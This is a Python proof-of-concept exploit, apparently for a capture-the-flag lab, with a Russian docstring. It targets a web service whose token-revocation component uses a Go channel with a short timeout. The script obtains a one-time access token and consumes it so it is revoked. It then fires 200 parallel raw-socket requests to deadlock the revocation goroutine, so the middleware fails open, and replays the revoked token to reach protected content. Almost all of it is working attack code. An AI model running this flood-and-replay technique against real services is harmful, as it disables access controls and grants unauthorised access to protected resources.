#!/usr/bin/env python3
"""
PoC: проверить hypothesis о goroutine-leak deadlock в revocation service.

Гипотеза:
  - Service.Revoke / CheckRevoked используют unbuffered chan + 50ms timeout.
  - Если goroutine не успевает за 50ms захватить mutex и сделать ch <- val,
    то после возврата select-а ресивера на ch больше нет.
  - Goroutine просыпается, делает работу, потом ch <- val БЛОКИРУЕТ навсегда.
  - defer Unlock() не выполняется → mutex захвачен НАВСЕГДА.
  - Все последующие Check/Revoke таймаутят → middleware fail-open на КАЖДОМ запросе.

Тест:
  1. Зарегистрировать пользователя.
  2. Получить B (OneTime VIP) через /lessons/15/request-access.
  3. Использовать B на /courses/4 → получить slug16. B теперь revoked.
  4. Подтвердить: GET /lessons/access/slug16 с B → 401 (B revoked).
  5. Заспамить ОДИН раунд большого параллелизма Check-ов, чтобы спровоцировать
     timeout → goroutine deadlock.
  6. Снова GET /lessons/access/slug16 с B → если 200 + flag, hypothesis ✅.
"""
from __future__ import annotations
import os, sys, time, secrets, string, threading, socket
from concurrent.futures import ThreadPoolExecutor
import requests

BASE = os.environ.get("BASE", "http://127.0.0.1:8080").rstrip("/")
N_FLOOD = int(os.environ.get("N_FLOOD", "200"))


def rand_user():
    u = "u" + "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(11))
    p = "Pw" + secrets.token_urlsafe(12)
    return u, p


def main():
    s = requests.Session()
    print(f"[i] target: {BASE}, N_FLOOD={N_FLOOD}")

    u, p = rand_user()
    r = s.post(f"{BASE}/api/auth/register", json={"username": u, "password": p}, timeout=10)
    print(f"[1] register: {r.status_code}")
    if r.status_code not in (200, 201):
        print(r.text); return 1

    r = s.post(f"{BASE}/api/auth/login", json={"username": u, "password": p}, timeout=10)
    print(f"[2] login: {r.status_code}")
    user_tok = r.json()["token"]

    # Issue B
    r = s.post(f"{BASE}/api/courses/4/lessons/15/request-access",
               headers={"Authorization": f"Bearer {user_tok}"}, timeout=10)
    print(f"[3] request-access: {r.status_code}")
    j = r.json()
    B = j["token"]

    # Use B → /courses/4 to get slug16
    r = requests.get(f"{BASE}/api/courses/4",
                     headers={"Authorization": f"Bearer {B}"}, timeout=10)
    print(f"[4] /courses/4 with B: {r.status_code}")
    slug16 = None
    for l in r.json().get("lessons", []):
        if l["id"] == 16 and l.get("slug"):
            slug16 = l["slug"]
    print(f"    slug16: {slug16[:32] if slug16 else None}...")

    # Confirm B is now revoked
    r = requests.get(f"{BASE}/api/courses/4/lessons/access/{slug16}",
                     headers={"Authorization": f"Bearer {B}"}, timeout=10)
    print(f"[5] /lessons/access pre-flood: {r.status_code} -> {r.text[:120]}")

    # === FLOOD PHASE ===
    # Pre-issue lots of OneTime tokens; use raw sockets to fire them all at once.
    print(f"[6] pre-issuing {N_FLOOD} OneTime tokens...")
    flood_toks = []
    for i in range(N_FLOOD):
        try:
            rr = s.post(f"{BASE}/api/courses/4/lessons/15/request-access",
                        headers={"Authorization": f"Bearer {user_tok}"}, timeout=10)
            flood_toks.append(rr.json()["token"])
        except Exception as e:
            print(f"    issue {i} failed: {e}")
            break

    print(f"    got {len(flood_toks)} flood tokens")

    # Fire them all with high parallelism via raw sockets
    HOST = "127.0.0.1"
    PORT = 8080

    def make_req(tok):
        return (
            f"GET /api/courses/4 HTTP/1.1\r\n"
            f"Host: {HOST}\r\n"
            f"Authorization: Bearer {tok}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

    barrier = threading.Barrier(len(flood_toks))

    def fire(tok):
        try:
            sock = socket.create_connection((HOST, PORT), timeout=10)
        except Exception:
            barrier.wait()
            return
        try:
            barrier.wait()
            try:
                sock.sendall(make_req(tok))
            except: pass
        finally:
            try: sock.close()
            except: pass

    print(f"[7] flooding with {len(flood_toks)} parallel /courses/4...")
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=len(flood_toks)) as ex:
        futs = [ex.submit(fire, t) for t in flood_toks]
        for f in futs:
            try: f.result(timeout=10)
            except: pass
    print(f"    flood done in {time.time()-t0:.2f}s")

    # Wait a bit for server to settle
    time.sleep(0.5)

    # Try B again → if revocation is dead, fail-open will allow it
    r = requests.get(f"{BASE}/api/courses/4/lessons/access/{slug16}",
                     headers={"Authorization": f"Bearer {B}"}, timeout=10)
    print(f"[8] /lessons/access POST-flood: {r.status_code}")
    print(f"    body: {r.text[:300]}")
    if r.status_code == 200:
        print("\n[+] HYPOTHESIS CONFIRMED: revocation service is dead, B works again!")
        return 0
    else:
        print("\n[-] hypothesis not confirmed (yet) — try increasing N_FLOOD")
        return 1


if __name__ == "__main__":
    sys.exit(main())
